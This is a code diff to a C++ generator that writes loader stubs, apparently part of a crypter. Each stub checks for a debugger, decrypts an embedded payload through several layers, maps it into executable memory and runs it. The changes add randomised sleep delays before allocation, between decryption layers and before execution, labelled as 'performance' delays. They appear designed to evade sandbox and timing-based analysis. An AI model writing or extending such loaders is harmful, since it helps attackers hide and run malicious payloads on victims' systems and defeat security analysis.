@@ -165,11 +165,16 @@ public:
         // Headers
         stub << "#include <cstring>\n";
         stub << "#include <cstdint>\n";
+        stub << "#include <chrono>\n";
+        stub << "#include <thread>\n";
+        stub << "#include <random>\n";
         stub << "#ifdef _WIN32\n";
         stub << "#include <windows.h>\n";
         stub << "#else\n";
         stub << "#include <sys/mman.h>\n";
         stub << "#include <unistd.h>\n";
+        stub << "#include <cstdio>\n";
+        stub << "#include <cstdlib>\n";
         stub << "#endif\n\n";
         
         // Anti-debug check function
@@ -196,6 +201,17 @@ public:
         
         // Main function
         stub << "int main() {\n";
+        
+        // Random delay function
+        stub << "    // Random performance delay\n";
+        stub << "    {\n";
+        stub << "        std::random_device rd;\n";
+        stub << "        std::mt19937 gen(rd());\n";
+        stub << "        std::uniform_int_distribution<> delay_dist(1, 999);\n";
+        stub << "        int delay_ms = delay_dist(gen);\n";
+        stub << "        std::this_thread::sleep_for(std::chrono::milliseconds(delay_ms));\n";
+        stub << "    }\n\n";
+        
         stub << "    // Anti-debug\n";
         stub << "    if (" << v1 << "()) return 0;\n\n";
         
@@ -242,6 +258,14 @@ public:
         stub << "};\n\n";
         
         // Allocate executable memory
+        stub << "    // Random delay before memory allocation\n";
+        stub << "    {\n";
+        stub << "        std::random_device rd;\n";
+        stub << "        std::mt19937 gen(rd());\n";
+        stub << "        std::uniform_int_distribution<> alloc_dist(1, 50);\n";
+        stub << "        std::this_thread::sleep_for(std::chrono::milliseconds(alloc_dist(gen)));\n";
+        stub << "    }\n\n";
+        
         stub << "    // Allocate executable memory\n";
         stub << "    size_t " << v6 << " = sizeof(" << v2 << ");\n";
         stub << "#ifdef _WIN32\n";
@@ -264,6 +288,18 @@ public:
         // Apply decryption in reverse order
         for (int i = 2; i >= 0; i--) {
             int method = keys.encryptionOrder[i];
+            
+            // Add random micro-delays between decryption layers
+            if (i < 2) {
+                stub << "    // Random micro-delay\n";
+                stub << "    {\n";
+                stub << "        std::random_device rd;\n";
+                stub << "        std::mt19937 gen(rd());\n";
+                stub << "        std::uniform_int_distribution<> micro_dist(1, 100);\n";
+                stub << "        std::this_thread::sleep_for(std::chrono::microseconds(micro_dist(gen)));\n";
+                stub << "    }\n\n";
+            }
+            
             switch (method) {
                 case 0: // AES
                     stub << "    // Decrypt AES layer\n";
@@ -295,6 +331,14 @@ public:
         stub << "#else\n";
         stub << "    mprotect(" << v7 << ", " << v6 << ", PROT_READ | PROT_EXEC);\n";
         stub << "#endif\n\n";
+        
+        stub << "    // Final random delay before execution\n";
+        stub << "    {\n";
+        stub << "        std::random_device rd;\n";
+        stub << "        std::mt19937 gen(rd());\n";
+        stub << "        std::uniform_int_distribution<> exec_dist(1, 100);\n";
+        stub << "        std::this_thread::sleep_for(std::chrono::milliseconds(exec_dist(gen)));\n";
+        stub << "    }\n\n";
         
         stub << "    // Execute payload\n";
         stub << "    ((void(*)())" << v7 << ")();\n\n";
